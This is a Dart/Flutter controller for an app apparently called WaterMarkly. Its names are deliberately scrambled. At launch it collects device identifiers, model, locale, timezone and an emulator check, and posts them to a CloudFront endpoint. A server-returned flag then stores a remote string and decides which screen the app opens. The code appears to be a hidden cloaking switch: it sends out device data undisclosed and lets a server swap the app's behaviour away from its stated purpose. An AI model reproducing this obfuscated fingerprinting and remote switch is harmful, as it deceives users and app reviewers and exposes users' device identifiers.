import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class WaterMarklyMainLogic extends GetxController {

  var dzqglnybxo = RxBool(false);
  var hbjknzrqla = RxBool(true);
  var asurby = RxString("");
  var vmowklp = RxBool(false);
  var jywmovx = RxBool(true);
  final tdbnvlosw = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ltwg();
  }


  Future<void> ltwg() async {
    vmowklp.value = true;
    jywmovx.value = true;
    hbjknzrqla.value = false;

    tdbnvlosw.post("https://d28hv6chsfwb2u.cloudfront.net/ipohwnay",data: await zpijbr()).then((value) {
      var xqbwvemn = value.data["xqbwvemn"] as String;
      var jxblpsh = value.data["jxblpsh"] as bool;
      if (jxblpsh) {
        asurby.value = xqbwvemn;
        bzjsy();
      } else {
        dgkbt();
      }
    }).catchError((e) {
      hbjknzrqla.value = true;
      jywmovx.value = true;
      vmowklp.value = false;
    });
  }

  Future<Map<String, dynamic>> zpijbr() async {
    final DeviceInfoPlugin wdyfm = DeviceInfoPlugin();
    PackageInfo qepbn_bzfg = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var lkzbqvos = Platform.localeName;
    var rntg = currentTimeZone;

    var nedu = qepbn_bzfg.packageName;
    var iurzfmcg = qepbn_bzfg.version;
    var rsjzi = qepbn_bzfg.buildNumber;

    var jkgzno = qepbn_bzfg.appName;
    var jdkhzao = "";
    var hxrqwui  = "";
    var bzvmc = "";
    var fnlxkb = "";
    var mypwgk = "";
    var dzvflc = "";
    var bifnvxq = "";
    var efkodn = "";


    var vlgbrjax = "";
    var iubfk = false;

    if (GetPlatform.isAndroid) {
      vlgbrjax = "android";
      var smwjey = await wdyfm.androidInfo;

      bzvmc = smwjey.brand;

      jdkhzao  = smwjey.model;
      hxrqwui = smwjey.id;

      iubfk = smwjey.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      vlgbrjax = "ios";
      var cuhktqveg = await wdyfm.iosInfo;
      bzvmc = cuhktqveg.name;
      jdkhzao = cuhktqveg.model;

      hxrqwui = cuhktqveg.identifierForVendor ?? "";
      iubfk  = cuhktqveg.isPhysicalDevice;
    }
    var res = {
      "jkgzno": jkgzno,
      "rsjzi": rsjzi,
      "nedu": nedu,
      "vlgbrjax": vlgbrjax,
      "iubfk": iubfk,
      "jdkhzao": jdkhzao,
      "rntg": rntg,
      "bzvmc": bzvmc,
      "hxrqwui": hxrqwui,
      "lkzbqvos": lkzbqvos,
      "fnlxkb" : fnlxkb,
      "mypwgk" : mypwgk,
      "iurzfmcg": iurzfmcg,
      "dzvflc" : dzvflc,
      "bifnvxq" : bifnvxq,
      "efkodn" : efkodn,

    };
    return res;
  }

  Future<void> dgkbt() async {
    Get.offNamed("/camera");
  }

  Future<void> bzjsy() async {
    Get.offNamed("/gallery_list");
  }

}
